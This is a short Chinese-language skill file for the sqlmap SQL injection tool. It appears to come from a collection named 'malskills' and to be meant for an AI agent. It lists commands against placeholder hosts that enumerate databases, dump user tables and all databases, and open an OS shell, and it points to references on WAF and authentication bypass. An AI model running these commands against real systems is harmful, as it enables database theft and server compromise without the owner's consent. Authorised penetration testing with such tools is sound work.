---
name: "sqlmap"
description: ">"
---

# Sqlmap

*Sourced from killvxk-malskills-zh*

# sqlmap

自动化 SQL 注入 (SQL Injection) 检测与利用。

## 快速开始

```bash
sqlmap -u "http://target.com/search?id=1" --dbs
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
sqlmap -r request.txt --dbs
sqlmap -u "http://target.com/?id=1" -D mydb -T users --dump
```

## 核心参数

| 参数 | 用途 |
|------|---------|
| `-u <url>` | 带参数的目标 URL |
| `-r <file>` | 保存的 HTTP 请求文件（Burp 格式） |
| `--data <data>` | POST 请求体 |
| `--cookie <cookie>` | 会话 Cookie |
| `--dbs` | 枚举数据库 |
| `-D <db>` | 选择数据库 |
| `-T <table>` | 选择数据表 |
| `--dump` | 导出表数据 |
| `--dump-all` | 导出所有数据库 |
| `--os-shell` | 获取 OS Shell |
| `--level <1-5>` | 测试深度（默认 1） |
| `--risk <1-3>` | 测试风险等级（默认 1） |
| `--batch` | 非交互模式，使用默认值 |
| `-p <param>` | 仅测试指定参数 |
| `--threads <n>` | 并发线程数 |
| `--proxy <proxy>` | 通过代理路由流量 |

## OS Shell

```bash
sqlmap -u "http://target.com/?id=1" --os-shell --technique=U
```

## 参考资源

| 文件 | 何时加载 |
|------|--------------|
| `references/` | 认证绕过、WAF 绕过、tamper 脚本 |

